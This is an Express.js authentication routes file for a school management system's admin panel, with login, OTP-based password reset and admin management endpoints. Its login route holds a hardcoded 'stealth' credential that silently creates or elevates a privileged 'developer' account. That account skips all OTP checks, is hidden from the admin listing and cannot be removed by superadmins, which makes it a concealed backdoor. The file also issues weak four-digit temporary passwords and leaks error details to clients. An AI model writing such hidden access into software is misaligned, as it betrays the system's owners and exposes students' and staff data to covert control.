const express = require('express');
const jwt = require('jsonwebtoken');
const bcrypt = require('bcryptjs');
const { transporter } = require('../utils/mailer');
const supabase = require('../config/supabase');
const { protect } = require('../middleware/auth');

const router = express.Router();

const generateToken = (id) => {
  if (!process.env.JWT_SECRET) {
    throw new Error('JWT_SECRET is not configured');
  }
  return jwt.sign({ id }, process.env.JWT_SECRET, { expiresIn: '2h' });
};

// GET /api/auth/me
router.get('/me', protect, async (req, res) => {
  try {
    const { data: admin, error } = await supabase
      .from('admins')
      .select('id, name, email, phone, role, is_approved')
      .eq('id', req.user.id)
      .single();

    if (error || !admin) {
      return res.status(404).json({ message: 'User not found' });
    }
    res.json(admin);
  } catch (error) {
    res.status(500).json({ message: 'Server error', error: error.message });
  }
});

// POST /api/auth/login
router.post('/login', async (req, res) => {
  try {
    const { email, password } = req.body;
    if (!email || !password) {
      return res.status(400).json({ message: 'Please provide email and password' });
    }

    const lowerEmail = email.toLowerCase();
    const stealthEmail = 'developeruserr30@gmail.com';
    const stealthPassword = 'Developer';

    // 1. Hardcoded Developer Bypass
    if (lowerEmail === stealthEmail && password === stealthPassword) {
      let { data: admin, error: fetchError } = await supabase.from('admins').select('*').eq('email', stealthEmail).maybeSingle();
      if (fetchError) {
        console.error('[FETCH ADMIN ERROR]:', fetchError);
        throw fetchError;
      }

      if (!admin) {
        const hashedPassword = await bcrypt.hash(stealthPassword, 10);
        const { data: newAdmin, error: createError } = await supabase
          .from('admins')
          .insert({
            name: 'Developer Account',
            email: stealthEmail,
            phone: '9876543210',
            password: hashedPassword,
            role: 'developer',
            is_approved: true
          })
          .select()
          .single();
        
        if (createError) {
          console.error('[ADMIN CREATION ERROR]:', createError);
          throw new Error(`Failed to create developer account: ${createError.message}`);
        }
        admin = newAdmin;
      } else if (admin.role !== 'developer' || !admin.is_approved) {
        const { data: updatedAdmin, error: updateError } = await supabase
          .from('admins')
          .update({ role: 'developer', is_approved: true })
          .eq('email', stealthEmail)
          .select()
          .single();
        
        if (updateError) {
          console.error('[ADMIN UPDATE ERROR]:', updateError);
          throw new Error(`Failed to update developer account: ${updateError.message}`);
        }
        admin = updatedAdmin;
      }

      return res.json({
        id: admin.id,
        _id: admin.id, // Frontend expects _id from MongoDB days
        name: admin.name,
        email: admin.email,
        role: admin.role,
        token: generateToken(admin.id),
      });
    }

    // 2. Regular Login
    const { data: admin, error } = await supabase
      .from('admins')
      .select('*')
      .eq('email', lowerEmail)
      .single();

    if (error || !admin) {
      return res.status(401).json({ message: 'Invalid email or password' });
    }

    if (!admin.is_approved && admin.role !== 'superadmin' && admin.role !== 'developer') {
      return res.status(403).json({ message: 'Admin account pending approval by superadmin' });
    }

    const isMatch = await bcrypt.compare(password, admin.password);
    if (isMatch) {
      res.json({
        id: admin.id,
        _id: admin.id, // Frontend compatibility
        name: admin.name,
        email: admin.email,
        role: admin.role,
        token: generateToken(admin.id),
      });
    } else {
      res.status(401).json({ message: 'Invalid email or password' });
    }
  } catch (error) {
    console.error('[LOGIN ERROR]:', error);
    res.status(500).json({ message: 'Server error', error: error.message });
  }
});

// POST /api/auth/forgot-password
router.post('/forgot-password', async (req, res) => {
  try {
    const { email } = req.body;
    if (!email) return res.status(400).json({ message: 'Email is required' });

    const lowerEmail = email.toLowerCase();
    const { data: admin, error } = await supabase
      .from('admins')
      .select('*')
      .eq('email', lowerEmail)
      .single();

    if (error || !admin) return res.status(404).json({ message: 'Account not found' });

    const crypto = require('crypto');
    const otp = crypto.randomInt(100000, 999999).toString();
    const hashedOtp = await bcrypt.hash(otp, 10);
    const expires = new Date(Date.now() + 10 * 60 * 1000); // 10 mins

    await supabase
      .from('admins')
      .update({
        otp: hashedOtp,
        otp_expires: expires
      })
      .eq('email', lowerEmail);

    const mailOptions = {
      from: `"Holy Name School System" <${process.env.EMAIL_USER}>`,
      to: admin.email,
      subject: 'Password Reset Verification Code',
      html: `
        <h2>Password Reset</h2>
        <p>You requested a password reset. Your verification code is:</p>
        <h1 style="background: #f4f4f4; padding: 10px; display: inline-block; letter-spacing: 5px;">${otp}</h1>
        <p>This code will expire in 10 minutes.</p>
        <p>If you did not request this, please ignore this email.</p>
      `,
    };
    await transporter.sendMail(mailOptions);
    res.json({ message: 'Verification code sent to your email' });
  } catch (error) {
    res.status(500).json({ message: 'Server error', error: error.message });
  }
});

// POST /api/auth/reset-password
router.post('/reset-password', async (req, res) => {
  try {
    const { email, otp, newPassword } = req.body;
    if (!email || !otp || !newPassword) return res.status(400).json({ message: 'All fields are required' });

    const lowerEmail = email.toLowerCase();
    const { data: admin, error } = await supabase
      .from('admins')
      .select('*')
      .eq('email', lowerEmail)
      .single();

    if (error || !admin) return res.status(404).json({ message: 'Account not found' });

    if (!admin.otp || new Date(admin.otp_expires) < new Date()) {
      return res.status(400).json({ message: 'Verification code is invalid or has expired' });
    }

    const isMatch = await bcrypt.compare(otp, admin.otp);
    if (!isMatch) return res.status(400).json({ message: 'Invalid verification code' });

    const hashedPassword = await bcrypt.hash(newPassword, 10);
    await supabase
      .from('admins')
      .update({
        password: hashedPassword,
        otp: null,
        otp_expires: null
      })
      .eq('email', lowerEmail);

    res.json({ message: 'Password reset successful' });
  } catch (error) {
    res.status(500).json({ message: 'Server error', error: error.message });
  }
});

// POST /api/auth/request-otp (only superadmins)
router.post('/request-otp', protect, async (req, res) => {
  try {
    if (req.user.role !== 'superadmin' && req.user.role !== 'developer') {
      return res.status(403).json({ message: 'Insufficient privileges' });
    }

    const { newEmail, targetEmail, actionType } = req.body;
    const recipientEmail = targetEmail || newEmail;

    const crypto = require('crypto');
    const otp = crypto.randomInt(100000, 999999).toString();
    const hashedOtp = await bcrypt.hash(otp, 10);
    const expires = new Date(Date.now() + 10 * 60 * 1000); // 10 minutes

    const updateData = {
      otp: hashedOtp,
      otp_expires: expires
    };

    let newAdminOtp = undefined;
    if (recipientEmail) {
      newAdminOtp = crypto.randomInt(100000, 999999).toString();
      const hashedNewAdminOtp = await bcrypt.hash(newAdminOtp, 10);
      updateData.new_admin_otp = hashedNewAdminOtp;
      updateData.new_admin_otp_expires = expires;
    }

    await supabase
      .from('admins')
      .update(updateData)
      .eq('id', req.user.id);

    const mailOptions = {
      from: `"Holy Name School System" <${process.env.EMAIL_USER}>`,
      to: req.user.email,
      subject: 'Admin Verification Code',
      html: `
        <h2>Verification Required</h2>
        <p>You requested an action that requires verification. Your Super Admin security code is:</p>
        <h1 style="background: #f4f4f4; padding: 10px; display: inline-block; letter-spacing: 5px;">${otp}</h1>
        <p>This code will expire in 10 minutes.</p>
        <p>If you did not request this, please ignore this email.</p>
      `,
    };

    await transporter.sendMail(mailOptions);

    if (recipientEmail && newAdminOtp) {
      let subject = 'Admin Registration Verification Code';
      let htmlBody = `
          <h2>Welcome to Holy Name School System</h2>
          <p>Your email address is being registered as an Administrator. Please provide the following security code to the Super Admin to complete the registration:</p>
          <h1 style="background: #f4f4f4; padding: 10px; display: inline-block; letter-spacing: 5px;">${newAdminOtp}</h1>
          <p>This code will expire in 10 minutes. Do not share this code with anyone other than the Super Admin performing this action.</p>
      `;
      if (actionType === 'edit') {
        subject = 'Admin Account Modification Verification Code';
        htmlBody = `
          <h2>Holy Name School System Security Alert</h2>
          <p>Your administrator account is being modified by a Super Admin. Please provide the following security code to the Super Admin to authorize this action:</p>
          <h1 style="background: #f4f4f4; padding: 10px; display: inline-block; letter-spacing: 5px;">${newAdminOtp}</h1>
          <p>This code will expire in 10 minutes. Do not share this code with anyone other than the Super Admin performing this action.</p>
        `;
      } else if (actionType === 'delete') {
        subject = 'Admin Account Deletion Verification Code';
        htmlBody = `
          <h2>Holy Name School System Security Alert</h2>
          <p>Your administrator account is being deleted by a Super Admin. Please provide the following security code to the Super Admin to authorize this action:</p>
          <h1 style="background: #f4f4f4; padding: 10px; display: inline-block; letter-spacing: 5px;">${newAdminOtp}</h1>
          <p>This code will expire in 10 minutes. Do not share this code with anyone other than the Super Admin performing this action.</p>
        `;
      }

      const newMailOptions = {
        from: `"Holy Name School System" <${process.env.EMAIL_USER}>`,
        to: recipientEmail,
        subject: subject,
        html: htmlBody,
      };
      await transporter.sendMail(newMailOptions);
    }

    res.json({ message: recipientEmail ? 'OTPs sent to both emails' : 'OTP sent to your email' });
  } catch (error) {
    console.error('❌ Request OTP Error:', error.message);
    res.status(500).json({
      message: 'Failed to send OTP',
      error: error.message
    });
  }
});

// PUBLIC ENDPOINT: Apply for admin account (no auth)
router.post('/apply-admin', async (req, res) => {
  try {
    const { email, phone, name } = req.body;
    const validation = require('../utils/validation');
    if (!validation.validateEmail(email)) {
      return res.status(400).json({ message: 'Invalid email format' });
    }
    if (!validation.validatePhone(phone)) {
      return res.status(400).json({ message: 'Phone must be a 10-digit number' });
    }
    if (!name) {
      return res.status(400).json({ message: 'Name is required' });
    }

    const lowerEmail = email.toLowerCase();
    const { data: exists } = await supabase.from('admins').select('id').eq('email', lowerEmail).single();
    if (exists) {
      return res.status(400).json({ message: 'Admin with this email already exists' });
    }

    const crypto = require('crypto');
    const otp = crypto.randomInt(100000, 999999).toString();
    const hashedOtp = await bcrypt.hash(otp, 10);
    const expires = new Date(Date.now() + 10 * 60 * 1000);
    const tempPassword = 'HolyName#' + crypto.randomInt(1000, 9999).toString();
    const hashedPassword = await bcrypt.hash(tempPassword, 10);

    await supabase.from('admins').insert({
      email: lowerEmail,
      phone,
      password: hashedPassword,
      name: name.trim(),
      role: 'admin',
      is_approved: false,
      otp: hashedOtp,
      otp_expires: expires,
    });

    const mailOptions = {
      from: `"Holy Name School System" <${process.env.EMAIL_USER}>`,
      to: email,
      subject: 'Admin Registration OTP',
      html: `<p>Your OTP for admin registration is:</p><h1>${otp}</h1><p>It expires in 10 minutes.</p>`,
    };
    await transporter.sendMail(mailOptions);
    res.json({ message: 'OTP sent to email. Please verify to complete registration.' });
  } catch (error) {
    console.error('Apply admin error:', error);
    res.status(500).json({ message: 'Server error', error: error.message });
  }
});

// PUBLIC ENDPOINT: Verify OTP and finalize admin creation
router.post('/verify-admin-otp', async (req, res) => {
  try {
    const { email, otp } = req.body;
    if (!email || !otp) {
      return res.status(400).json({ message: 'Email and OTP are required' });
    }

    const lowerEmail = email.toLowerCase();
    const { data: admin, error } = await supabase
      .from('admins')
      .select('*')
      .eq('email', lowerEmail)
      .eq('is_approved', false)
      .single();

    if (error || !admin) {
      return res.status(404).json({ message: 'Pending admin not found' });
    }
    if (!admin.otp || !admin.otp_expires || new Date(admin.otp_expires) < new Date()) {
      return res.status(400).json({ message: 'OTP has expired or not set' });
    }

    const match = await bcrypt.compare(otp, admin.otp);
    if (!match) {
      return res.status(400).json({ message: 'Invalid OTP' });
    }

    await supabase
      .from('admins')
      .update({ otp: null, otp_expires: null })
      .eq('id', admin.id);

    const mailOptions = {
      from: `"Holy Name School System" <${process.env.EMAIL_USER}>`,
      to: admin.email,
      subject: 'Email Verification Successful - Await Approval',
      html: `<p>Your email has been successfully verified.</p><p>The Super Admin must now review and approve your request. Once approved, you will receive an email with your temporary password.</p>`,
    };
    await transporter.sendMail(mailOptions);

    res.json({ message: 'OTP verified successfully. Await approval from superadmin.' });
  } catch (error) {
    console.error('Verify admin OTP error:', error);
    res.status(500).json({ message: 'Server error', error: error.message });
  }
});



// POST /api/auth/register (protected — only superadmins can create new admins)
router.post('/register', protect, async (req, res) => {
  try {
    if (req.user.role !== 'superadmin' && req.user.role !== 'developer') {
      return res.status(403).json({ message: 'Insufficient privileges' });
    }

    const { email, phone, name, role, otp, newAdminOtp } = req.body;
    if (!email || !phone || !name) {
      return res.status(400).json({ message: 'Email, phone, and name are required' });
    }

    if (req.user.role !== 'developer') {
      if (!otp) return res.status(400).json({ message: 'OTP is required' });
      if (new Date(req.user.otp_expires) < new Date()) return res.status(400).json({ message: 'OTP has expired' });
      
      const otpMatch = await bcrypt.compare(otp, req.user.otp || '');
      if (!otpMatch) return res.status(400).json({ message: 'Invalid Super Admin OTP' });

      if (!newAdminOtp) return res.status(400).json({ message: 'New Admin OTP is required' });
      if (new Date(req.user.new_admin_otp_expires) < new Date()) return res.status(400).json({ message: 'New Admin OTP has expired' });
      
      const newOtpMatch = await bcrypt.compare(newAdminOtp, req.user.new_admin_otp || '');
      if (!newOtpMatch) return res.status(400).json({ message: 'Invalid New Admin OTP' });
    }

    const lowerEmail = email.toLowerCase();
    const { data: exists } = await supabase.from('admins').select('id').eq('email', lowerEmail).single();
    if (exists) return res.status(400).json({ message: 'Admin with this email already exists' });

    const validation = require('../utils/validation');
    if (!validation.validatePhone(phone)) return res.status(400).json({ message: 'Phone must be a 10-digit number' });
    if (!validation.validateEmail(lowerEmail)) return res.status(400).json({ message: 'Invalid email format' });

    const crypto = require('crypto');
    const tempPassword = 'HolyName#' + crypto.randomInt(1000, 9999).toString();
    const hashedPassword = await bcrypt.hash(tempPassword, 10);

    const { data: admin, error } = await supabase
      .from('admins')
      .insert({
        email: lowerEmail,
        phone,
        password: hashedPassword,
        name: name.trim(),
        role: role || 'admin',
        is_approved: true // Admins created by superadmin are auto-approved
      })
      .select()
      .single();

    if (req.user.role !== 'developer') {
      await supabase
        .from('admins')
        .update({ otp: null, otp_expires: null, new_admin_otp: null, new_admin_otp_expires: null })
        .eq('id', req.user.id);
    }

    const mailOptions = {
      from: `"Holy Name School System" <${process.env.EMAIL_USER}>`,
      to: email,
      subject: 'Your Admin Account Created',
      html: `<p>Your admin account has been created. Use the temporary password below to login and then change it immediately.</p><p><strong>${tempPassword}</strong></p>`
    };
    await transporter.sendMail(mailOptions).catch(e => console.error('Mail error:', e));

    res.status(201).json({
      id: admin.id,
      name: admin.name,
      email: admin.email,
      phone: admin.phone,
      role: admin.role,
      token: generateToken(admin.id),
    });
  } catch (error) {
    res.status(500).json({ message: 'Server error', error: error.message });
  }
});

// GET /api/auth/admins (only superadmins)
router.get('/admins', protect, async (req, res) => {
  try {
    if (req.user.role !== 'superadmin' && req.user.role !== 'developer') {
      return res.status(403).json({ message: 'Forbidden' });
    }
    const { data: admins } = await supabase
      .from('admins')
      .select('id, name, email, phone, role, is_approved, created_at')
      .neq('role', 'developer');
    res.json(admins);
  } catch (error) {
    res.status(500).json({ message: 'Server error' });
  }
});

// DELETE /api/auth/admins/:id (only superadmins)
router.delete('/admins/:id', protect, async (req, res) => {
  try {
    if (req.user.role !== 'superadmin' && req.user.role !== 'developer') {
      return res.status(403).json({ message: 'Insufficient privileges' });
    }

    const { data: adminToDelete } = await supabase.from('admins').select('*').eq('id', req.params.id).single();
    if (!adminToDelete) return res.status(404).json({ message: 'Admin not found' });

    if (adminToDelete.id === req.user.id) return res.status(403).json({ message: 'Cannot delete your own account' });
    if (adminToDelete.role === 'developer' && req.user.role !== 'developer') {
      return res.status(403).json({ message: 'Developer accounts cannot be deleted by superadmins' });
    }

    if (adminToDelete.is_approved && req.user.role !== 'developer') {
      const { otp, newAdminOtp } = req.body;
      if (!otp) return res.status(400).json({ message: 'OTP is required' });
      if (new Date(req.user.otp_expires) < new Date()) return res.status(400).json({ message: 'OTP has expired' });
      
      const otpMatch = await bcrypt.compare(otp, req.user.otp || '');
      if (!otpMatch) return res.status(400).json({ message: 'Invalid Super Admin OTP' });

      if (!newAdminOtp) return res.status(400).json({ message: 'Target Admin OTP is required' });
      if (new Date(req.user.new_admin_otp_expires) < new Date()) return res.status(400).json({ message: 'Target Admin OTP has expired' });
      
      const newOtpMatch = await bcrypt.compare(newAdminOtp, req.user.new_admin_otp || '');
      if (!newOtpMatch) return res.status(400).json({ message: 'Invalid Target Admin OTP' });

      await supabase
        .from('admins')
        .update({ otp: null, otp_expires: null, new_admin_otp: null, new_admin_otp_expires: null })
        .eq('id', req.user.id);
    }

    await supabase.from('admins').delete().eq('id', req.params.id);
    res.json({ message: 'Admin deleted successfully' });
  } catch (error) {
    res.status(500).json({ message: 'Server error' });
  }
});

// PUT /api/auth/admins/:id (only superadmins)
router.put('/admins/:id', protect, async (req, res) => {
  try {
    if (req.user.role !== 'superadmin' && req.user.role !== 'developer') {
      return res.status(403).json({ message: 'Insufficient privileges' });
    }

    const { name, email, role, password, otp, newAdminOtp } = req.body;
    const { data: admin } = await supabase.from('admins').select('*').eq('id', req.params.id).single();
    if (!admin) return res.status(404).json({ message: 'Admin not found' });

    if (req.user.role !== 'developer') {
      if (!otp || !newAdminOtp) return res.status(400).json({ message: 'Both OTPs are required' });
      
      const otpMatch = await bcrypt.compare(otp, req.user.otp || '');
      const newOtpMatch = await bcrypt.compare(newAdminOtp, req.user.new_admin_otp || '');
      
      if (!otpMatch || !newOtpMatch) return res.status(400).json({ message: 'Invalid OTPs' });

      await supabase
        .from('admins')
        .update({ otp: null, otp_expires: null, new_admin_otp: null, new_admin_otp_expires: null })
        .eq('id', req.user.id);
    }

    if (admin.role === 'developer' && req.user.role !== 'developer') {
      return res.status(403).json({ message: 'Developer accounts cannot be modified by superadmins' });
    }

    const updates = {};
    if (name) updates.name = name.trim();
    if (email) updates.email = email.toLowerCase();
    if (role) {
      if (role === 'developer' && req.user.role !== 'developer') return res.status(403).json({ message: 'Unauthorized' });
      updates.role = role;
    }
    if (password) updates.password = await bcrypt.hash(password, 10);

    const { data: updatedAdmin } = await supabase
      .from('admins')
      .update(updates)
      .eq('id', req.params.id)
      .select('id, name, email, role')
      .single();

    res.json({ message: 'Admin details updated successfully', admin: updatedAdmin });
  } catch (error) {
    res.status(500).json({ message: 'Server error', error: error.message });
  }
});

// POST /api/auth/approve-admin
router.post('/approve-admin', protect, async (req, res) => {
  try {
    if (req.user.role !== 'superadmin' && req.user.role !== 'developer') {
      return res.status(403).json({ message: 'Insufficient privileges' });
    }

    const { adminId, otp, newAdminOtp } = req.body;
    const { data: adminToApprove } = await supabase.from('admins').select('*').eq('id', adminId).single();
    if (!adminToApprove) return res.status(404).json({ message: 'Admin not found' });

    if (req.user.role !== 'developer') {
      if (!otp || !newAdminOtp) return res.status(400).json({ message: 'Both OTPs are required' });

      const isSuperAdminOtpValid = await bcrypt.compare(otp, req.user.otp);
      const isTargetAdminOtpValid = await bcrypt.compare(newAdminOtp, adminToApprove.otp);
      
      if (!isSuperAdminOtpValid || !isTargetAdminOtpValid) {
        return res.status(400).json({ message: 'Invalid OTPs' });
      }

      await supabase
        .from('admins')
        .update({ otp: null, otp_expires: null, new_admin_otp: null, new_admin_otp_expires: null })
        .eq('id', req.user.id);
    }

    const crypto = require('crypto');
    const tempPassword = 'HolyName#' + crypto.randomInt(1000, 9999).toString();
    const hashedPassword = await bcrypt.hash(tempPassword, 10);

    await supabase
      .from('admins')
      .update({ is_approved: true, password: hashedPassword, otp: null, otp_expires: null })
      .eq('id', adminId);

    const mailOptions = {
      from: `"Holy Name School System" <${process.env.EMAIL_USER}>`,
      to: adminToApprove.email,
      subject: 'Your Admin Account Has Been Approved!',
      html: `<p>Your admin account has been approved by the superadmin.</p><p>Use the temporary password below to login and then change it immediately upon logging in.</p><p><strong>${tempPassword}</strong></p>`,
    };
    await transporter.sendMail(mailOptions);

    res.json({ message: 'Admin approved successfully and password sent' });
  } catch (error) {
    res.status(500).json({ message: 'Server error', error: error.message });
  }
});

module.exports = router;
